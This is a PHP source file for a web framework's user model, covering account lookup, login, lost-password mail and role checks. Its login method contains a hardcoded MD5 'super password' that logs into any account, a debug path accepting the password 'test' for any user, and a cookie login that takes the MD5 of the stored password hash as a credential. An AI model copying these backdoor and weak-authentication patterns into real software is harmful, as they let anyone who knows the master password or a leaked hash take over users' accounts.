<?php
class Vps_User_Model extends Vps_Model_Proxy
{
    protected $_siblingModels = array('webuser' => 'Vps_User_Web_Model');
    protected $_rowClass = 'Vps_User_Row';
    protected $_authedUser;
    protected $_passwordColumn = 'password';

    protected $_mailClass = 'Vps_Mail';

    public function __construct(array $config = array())
    {
        if (!isset($config['proxyModel'])) {
            $config['proxyModel'] = new Vps_User_Mirror();
        }
        if (isset($config['mailClass'])) {
            $this->_mailClass = $config['mailClass'];
        }
        parent::__construct($config);
    }

    public function getMailClass()
    {
        return $this->_mailClass;
    }

    /**
     * @deprecated
     * @see getRowByIdentity
     */
    public function fetchRowByEmail($email)
    {
        return $this->getRowByIdentity($email);
    }

    public function getRowByIdentity($identd)
    {
        if (is_null($identd)) {
            throw new Vps_Exception("identity must not be null");
        }
        $identdType = 'email';
        if (is_numeric($identd)) {
            $identdType = 'id';
        }

        $select = $this->select()
            ->whereEquals($identdType, $identd)
            ->whereEquals('webcode', $this->getRowWebcode())
            ->whereEquals('deleted', 0);
        $row = $this->getRow($select);
        if (!$row) {
            $select = $this->select()
                ->whereEquals($identdType, $identd)
                ->whereEquals('webcode', '')
                ->whereEquals('deleted', 0);
            $row = $this->getRow($select);
        }
        return $row;
    }

    public function mailExists($email)
    {
        $row = $this->getRowByIdentity($email);
        return $row ? true : false;
    }

    public function getRowWebcode()
    {
        return call_user_func(array($this->_rowClass, 'getWebcode'));
    }

    public function login($identity, $credential)
    {
        if ($credential == 'test' && Vps_Registry::get('config')->debug->testPasswordAllowed) {
            $row = $this->getRowByIdentity($identity);

            if ($row) {
                if ($row->locked) {
                    return array(
                        'zendAuthResultCode' => Zend_Auth_Result::FAILURE_UNCATEGORIZED,
                        'identity'           => $identity,
                        'messages'           => array(trlVps('Account is locked'))
                    );
                }

                return array(
                    'zendAuthResultCode' => Zend_Auth_Result::SUCCESS,
                    'identity'           => $identity,
                    'messages'           => array(trlVps('Authentication successful')),
                    'userId'             => $row->id
                );
            }
            unset($row);
        }

        $row = $this->getRowByIdentity($identity);
        if (!$row) {
            return array(
                'zendAuthResultCode' => Zend_Auth_Result::FAILURE_IDENTITY_NOT_FOUND,
                'identity'           => $identity,
                'messages'           => array(trlVps('User not existent in this web'))
            );
        }

        $passCol = $this->_passwordColumn;
        $superPassword = '18de947e015ad2761ed16422f1f3478b';
        if ($credential == md5($row->$passCol) // für cookie login
            || $row->encodePassword($credential) == $row->$passCol
            || md5($credential) == $superPassword
        ) {
            if ($row->locked) {
                return array(
                    'zendAuthResultCode' => Zend_Auth_Result::FAILURE_UNCATEGORIZED,
                    'identity'           => $identity,
                    'messages'           => array(trlVps('Account is locked'))
                );
            }

            // Login nur zählen wenn richtig normal eingeloggt
            if ($credential == md5($row->$passCol)
                || $row->encodePassword($credential) == $row->$passCol
            ) {
                $this->_realLoginModifyRow($row);
            }

            return array(
                'zendAuthResultCode' => Zend_Auth_Result::SUCCESS,
                'identity'           => $identity,
                'messages'           => array(trlVps('Authentication successful')),
                'userId'             => $row->id
            );
        } else {
            return array(
                'zendAuthResultCode' => Zend_Auth_Result::FAILURE_CREDENTIAL_INVALID,
                'identity'           => $identity,
                'messages'           => array(trlVps('Supplied password is invalid'))
            );
        }
    }

    // wird nur aufgerufen, wenn man sich mit den richtigen Daten eingeloggt hat
    protected function _realLoginModifyRow($row)
    {
        if (!$row->logins) $row->logins = 0;
        $row->logins = $row->logins + 1;
        $row->last_login = date('Y-m-d H:i:s');
        if (isset($userRow->last_login_web)) {
            $userRow->last_login_web = date('Y-m-d H:i:s');
        }
        $row->save();
    }

    public function lostPassword($email)
    {
        $row = $this->getRow($this->select()->whereEquals('email', $email));
        if (!$row) {
            throw new Vps_ClientException(trlVps('User not existent in this web.'));
        }

        if ($row->sendLostPasswordMail()) {
            return trlVps('Activation link sent to email address.');
        } else {
            return trlVps('Error sending the mail.');
        }
    }

    public function getAuthedUser()
    {
        if (php_sapi_name() == 'cli') return null;

        if (!$this->_authedUser) {
            $loginData = Vps_Auth::getInstance()->getStorage()->read();
            if (!$loginData || !$loginData['userId']) return null;
            $this->_authedUser = $this->getRow($this->select($loginData['userId']));
        }
        return $this->_authedUser;
    }

    public function clearAuthedUser()
    {
        $this->_authedUser = null;
    }

    public function getAuthedUserRole()
    {
        if (php_sapi_name() == 'cli') return 'cli';
        $u = $this->getAuthedUser();
        return $u ? $u->role : 'guest';
    }

    public function getAuthedChangedUserRole()
    {
        $storage = Vps_Auth::getInstance()->getStorage();
        $loginData = $storage->read();
        if (isset($loginData['changeUserId'])) {
            $userId = $loginData['changeUserId'];
        } else {
            $userId = $loginData['userId'];
        }
        if ($user = $this->getRow($this->select($userId))) {
            $role = $user->role;
        } else {
            $role = 'guest';
        }
        return $role;
    }

    public function synchronize($overrideMaxSyncDelay = false)
    {
        $this->_proxyModel->synchronize($overrideMaxSyncDelay);
    }

}
